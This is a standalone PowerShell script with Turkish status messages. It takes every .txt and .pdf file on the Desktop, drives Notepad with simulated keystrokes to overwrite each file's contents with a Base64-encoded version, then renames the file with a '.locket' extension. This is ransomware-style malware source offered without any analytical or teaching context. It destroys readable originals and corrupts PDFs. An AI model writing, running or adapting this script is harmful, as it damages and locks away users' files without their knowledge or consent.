Add-Type -AssemblyName System.Windows.Forms;$d=[Environment]::GetFolderPath("Desktop");$e=@("txt","pdf");foreach($x in $e){$f=Get-ChildItem -Path $d -Filter *.$x -File;foreach($y in $f){$p=$y.FullName;Write-Output "İşleniyor: $p";Start-Process notepad -ArgumentList $p;Start-Sleep 1.5;[System.Windows.Forms.SendKeys]::SendWait("^a");Start-Sleep 0.5;[System.Windows.Forms.SendKeys]::SendWait("^c");Start-Sleep 0.5;$c=Get-Clipboard -Raw;$b=[Text.Encoding]::UTF8.GetBytes($c);$B=[Convert]::ToBase64String($b);Set-Clipboard -Value $B;Start-Sleep 0.5;[System.Windows.Forms.SendKeys]::SendWait("^a");Start-Sleep 0.5;[System.Windows.Forms.SendKeys]::SendWait("{DEL}");Start-Sleep 0.5;[System.Windows.Forms.SendKeys]::SendWait("^v");Start-Sleep 0.5;[System.Windows.Forms.SendKeys]::SendWait("^s");Start-Sleep 0.5;[System.Windows.Forms.SendKeys]::SendWait("%{F4}");Start-Sleep 1;$n=$y.FullName+".locket";try{Rename-Item -Path $y.FullName -NewName $n -Force}catch{Write-Output "Uzantı değiştirilemedi: $($y.Name)"}}}
